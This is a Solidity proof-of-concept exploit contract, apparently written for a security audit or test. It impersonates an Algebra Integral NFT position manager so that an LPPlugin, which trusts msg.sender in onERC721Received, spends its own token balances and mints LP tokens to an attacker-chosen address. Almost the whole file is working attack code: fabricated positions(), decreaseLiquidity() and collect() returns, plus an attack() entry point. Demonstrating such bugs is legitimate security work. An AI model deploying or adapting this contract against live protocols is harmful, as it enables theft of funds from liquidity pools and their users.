// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@cryptoalgebra/integral-periphery/contracts/interfaces/INonfungiblePositionManager.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";

/**
 * @notice Malicious contract that impersonates INonfungiblePositionManager
 *         to exploit LPPlugin.onERC721Received's lack of msg.sender validation.
 *
 *         The plugin trusts msg.sender as a legitimate NFT manager and delegates
 *         positions(), decreaseLiquidity(), and collect() calls to it. This contract
 *         returns fabricated data that tricks the plugin into approving and forwarding
 *         its own held token balances into a liquidity position, then minting LP tokens
 *         to the attacker.
 */
contract MaliciousNFTManager {
    address public immutable target; // LPPlugin address
    address public token0;
    address public token1;
    uint256 public fakeAmount0;
    uint256 public fakeAmount1;
    int24 public tickLower;
    int24 public tickUpper;

    constructor(address _target) {
        target = _target;
    }

    function setParams(
        address _token0,
        address _token1,
        uint256 _amount0,
        uint256 _amount1,
        int24 _tickLower,
        int24 _tickUpper
    ) external {
        token0 = _token0;
        token1 = _token1;
        fakeAmount0 = _amount0;
        fakeAmount1 = _amount1;
        tickLower = _tickLower;
        tickUpper = _tickUpper;
    }

    /// @notice Returns fabricated position data with pool-matching tokens.
    ///         The plugin only checks that token0/token1 match the pool — trivially satisfied.
    function positions(uint256) external view returns (
        uint88 nonce,
        address operator,
        address _token0,
        address _token1,
        address deployer,
        int24 _tickLower,
        int24 _tickUpper,
        uint128 liquidity,
        uint256 feeGrowthInside0LastX128,
        uint256 feeGrowthInside1LastX128,
        uint128 tokensOwed0,
        uint128 tokensOwed1
    ) {
        return (0, address(0), token0, token1, address(0), tickLower, tickUpper, uint128(fakeAmount0), 0, 0, 0, 0);
    }

    /// @notice Returns fabricated amounts without performing any actual liquidity decrease.
    ///         No tokens are moved — the plugin just trusts the return values.
    function decreaseLiquidity(
        INonfungiblePositionManager.DecreaseLiquidityParams calldata
    ) external view returns (uint256, uint256) {
        return (fakeAmount0, fakeAmount1);
    }

    /// @notice Returns fabricated amounts without transferring any tokens to the plugin.
    ///         The plugin believes it received these amounts and proceeds to approve+spend
    ///         from its own pre-existing balances.
    function collect(
        INonfungiblePositionManager.CollectParams calldata
    ) external view returns (uint256, uint256) {
        return (fakeAmount0, fakeAmount1);
    }

    /// @notice Entry point: triggers the exploit by calling onERC721Received on the plugin.
    ///         The `from` parameter becomes the LP token recipient (the attacker).
    function attack(address attacker) external {
        IERC721Receiver(target).onERC721Received(
            address(this), // operator (unused by plugin)
            attacker,      // from — receives the minted LP tokens
            1,             // fake tokenId (plugin delegates to us, so any value works)
            abi.encode(0,0,1)             // empty data
        );
    }
}
